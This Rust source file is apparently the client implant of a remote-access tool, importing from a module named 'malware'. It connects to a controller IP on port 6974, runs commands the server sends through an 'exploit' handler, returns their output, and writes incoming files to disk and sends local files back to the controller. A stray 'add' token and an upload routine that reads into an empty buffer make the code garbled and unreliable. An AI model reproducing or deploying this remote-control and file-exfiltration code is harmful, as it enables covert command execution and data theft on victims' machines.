use std::{env, fs::File, io::{Read, Write}, net::Shutdown};

use bstr::ByteSlice;

use crate::{
    Application::malware::{
        Exploits,
        HandleExploits,
    },
    stprotocol::{
        Client,
        HandleProtocols,
        HandleSession,
        Session,
    },
    structure::{
        packet::{
            disconnect,
            download,
            exploit,
            response,
            upload,
        },
        utils::{
            enums::{
                EncryptType,
                HandshakeType,
                Packet,
            },
            structs::define::StructStone,
            traits::define::Detector,
        },
    },
};

type Result<T> = std::io::Result<T>;

impl Client {
    pub fn normal(ip: &str) -> Client {
        Client {
            session: Session::normal(format!("{}:{}", ip, 6974).as_str()),
            exploits: Exploits::default(),
        }
    }

    pub fn secure(ip: &str, handshake_type: HandshakeType, encrypt_type: EncryptType) -> Client {
        Client {
 add             session: Session::secure(format!("{}:{}", ip, 6974).as_str(), handshake_type, encrypt_type),
            exploits: Exploits::default(),
        }
    }

    pub fn receiving(&mut self) -> Packet {
        self.session.receiving(StructStone::buffer())
    }

    pub fn send(&mut self, packet: Packet) -> Result<&Packet> {
        self.set_packet(packet);
        self.session.send()
    }
}

impl HandleProtocols for Client {
    fn response(&mut self, msg: &str) -> Result<&Packet> {
        self.set_packet(response(msg));
        self.session.send()
    }

    fn disconnect(&mut self) {
        self.set_packet(disconnect());
        self.session.send().unwrap();
        self.session
            .take_socket()
            .shutdown(Shutdown::Both)
            .expect("TODO: panic message");
    }

    fn download(&mut self) -> Result<&Packet> {
        let file_arr: &[u8] = self.take_file().unwrap().as_slice();
        let mut fields: Vec<&[u8]> = file_arr.split_str("<name_end>").collect();

        let path = format!(
            "{:?}/{:?}",
            env::current_dir().unwrap(),
            String::from_utf8(Vec::from(fields[0])).unwrap()
        )
            .replace('"', "")
            .replace("\\", "/");

        let mut open_file = match File::create(path.clone()) {
            Ok(ok) => ok,
            Err(_) => return self.response("File Not Found"),
        };

        let file = match open_file.write_all(&mut fields[1]) {
            Ok(_) => format!("File {:?} upload successful", path)
                .as_bytes()
                .to_vec(),
            Err(_) => return self.response("File Not Found"),
        };

        self.set_packet(download(file));
        self.session.send()
    }

    fn upload(&mut self) -> Result<&Packet> {
        let path = match String::from_utf8(self.get_file()) {
            Ok(ok) => ok,
            Err(_) => return self.response("File Not Found"),
        };

        let mut open_file = match File::open(path.replace("\\", "/")) {
            Ok(file) => file,
            Err(_) => return self.response("File Not Found"),
        };
        let mut file = vec![];

        match open_file.read(&mut file) {
            Ok(ok) => ok.to_le_bytes().to_vec(),
            Err(_) => return self.response("File Not Found"),
        };
        self.set_packet(upload(file));
        self.session.send()
    }

    fn exploit(&mut self) -> Result<&Packet> {
        self.exploits.execute(self.get_command());
        let output = exploit(self.exploits.get_output());
        self.set_packet(output);
        self.session.send()
    }
}